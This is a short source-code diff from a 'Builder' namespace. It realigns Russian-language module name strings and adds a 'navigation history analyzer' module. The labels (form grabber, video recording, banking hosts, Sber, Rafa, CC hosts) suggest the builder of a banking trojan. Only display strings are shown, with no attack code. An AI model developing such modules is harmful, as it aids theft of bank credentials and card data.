@@ -46,15 +46,16 @@ namespace Builder
 
 
 
-PCHAR Module_BankHosts     = "Хосты режима BANKING";
-PCHAR Module_Hunter        = "Hunter";
-PCHAR Module_JavaConfig    = "Ссылки JAVA";
-PCHAR Module_VideoRecorder = "Запись видео";
-PCHAR Module_FormGraber    = "Форм грабер";
-PCHAR Module_AzConfig      = "Настройки AZ";
-PCHAR Module_SberHosts     = "Хосты Sber";
-PCHAR Module_RafaHosts     = "Хосты Rafa";
-PCHAR Module_CCHosts       = "Хосты CC";
+PCHAR Module_BankHosts       = "Хосты режима BANKING";
+PCHAR Module_Hunter          = "Hunter";
+PCHAR Module_JavaConfig      = "Ссылки JAVA";
+PCHAR Module_VideoRecorder   = "Запись видео";
+PCHAR Module_FormGraber      = "Форм грабер";
+PCHAR Module_AzConfig        = "Настройки AZ";
+PCHAR Module_SberHosts       = "Хосты Sber";
+PCHAR Module_RafaHosts       = "Хосты Rafa";
+PCHAR Module_CCHosts         = "Хосты CC";
+PCHAR Module_HistoryAnalyzer = "Анализатор истории навигации";
 
 
 
